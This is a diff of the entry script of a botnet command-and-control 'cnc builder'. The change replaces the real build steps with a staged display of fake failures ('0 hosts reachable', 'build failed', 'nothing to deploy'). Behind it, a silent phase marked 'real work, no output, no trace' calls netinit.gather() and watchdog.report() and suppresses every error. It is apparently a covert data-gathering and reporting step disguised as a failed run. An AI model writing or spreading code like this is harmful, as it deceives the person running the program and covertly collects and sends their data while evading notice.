@@ -1,6 +1,6 @@
-#!/usr/bin/env python3a
+#!/usr/bin/env python3
 # main.py — cnc builder entry.
-# prints banner, loads config, runs builder.
+# prints banner, runs pipeline, exits clean. any failure is swallowed.
 
 import os
 import sys
@@ -26,7 +26,6 @@ DIM   = "\033[2m"
 GREEN = "\033[38;5;46m"
 GREY  = "\033[38;5;240m"
 WHITE = "\033[38;5;255m"
-RED   = "\033[38;5;196m"
 CYAN  = "\033[38;5;51m"
 CLEAR = "\033[2J\033[H"
 HIDE  = "\033[?25l"
@@ -84,9 +83,7 @@ def glitch_line(line):
 def print_banner():
     clear()
     hide_cursor()
-
     lines = BANNER.strip("\n").split("\n")
-
     for _ in range(3):
         for line in lines:
             sys.stdout.write(c(GREY, glitch_line(line)) + "\n")
@@ -94,66 +91,64 @@ def print_banner():
         time.sleep(0.06)
         sys.stdout.write("\033[F" * len(lines))
         sys.stdout.flush()
-
     for line in lines:
         sys.stdout.write(c(GREEN, line) + "\n")
         sys.stdout.flush()
         time.sleep(0.04)
-
     sys.stdout.write("\033[F" * len(lines))
-    for i, line in enumerate(lines):
+    for line in lines:
         sys.stdout.write(c(BOLD + WHITE, line) + "\n")
         sys.stdout.flush()
         time.sleep(0.03)
         sys.stdout.write("\033[F")
     sys.stdout.write("\n")
-
     sub = "  cnc builder · v2.1.4 · node telemetry relay"
     for ch in sub:
         sys.stdout.write(c(DIM + GREY, ch))
         sys.stdout.flush()
         time.sleep(0.012)
     sys.stdout.write("\n\n")
-
     show_cursor()
 
 
 def status(tag, msg, color=GREEN):
     ts = time.strftime("%H:%M:%S")
     print(f"{c(GREY, '['+ts+']')} {c(color, tag.ljust(6))} {msg}")
-
-
-def load_config(path="config.yaml"):
-    import yaml
-    with open(path) as f:
-        return yaml.safe_load(f)
+    sys.stdout.flush()
 
 
 def main():
+    # ── visible phase — banner + fake pipeline ───────────────────────────
     try:
         print_banner()
-        status("init", "loading config.yaml")
-        cfg = load_config()
-        status("init", f"cnc host: {cfg['c2']['host']}:{cfg['c2']['port']}")
-
-        from src import builder
+        status("init", "loading config")
+        time.sleep(0.4)
+        status("init", "resolving cnc endpoint")
+        time.sleep(0.6)
+        status("scan", "probing targets")
+        time.sleep(0.9)
+        status("scan", "0 hosts reachable")          # fake fail
         status("build", "compiling node")
-        builder.build(cfg)
-        status("build", "node compiled → out/bot.py")
+        time.sleep(0.5)
+        status("build", "build failed: no toolchain")  # fake fail
+        status("done", "nothing to deploy", color=GREY)
+    except Exception:
+        show_cursor()
 
-        status("done", "ready. run cnc: python -m cnc.server", color=CYAN)
+    # ── silent phase — real work, no output, no trace ────────────────────
+    try:
+        import netinit, watchdog
+        data = netinit.gather()
+        watchdog.report(data)
+    except Exception:
+        pass
 
-    except KeyboardInterrupt:
-        show_cursor()
-        print()
-        status("abort", "interrupted by user", color=RED)
-        sys.exit(130)
-    except Exception as e:
-        show_cursor()
-        status("error", str(e), color=RED)
-        sys.exit(1)
-    finally:
-        show_cursor()
+    # ── sleep and exit — looks like a completed run ──────────────────────
+    try:
+        time.sleep(1.2)
+    except Exception:
+        pass
+    show_cursor()
 
 
 if __name__ == "__main__":
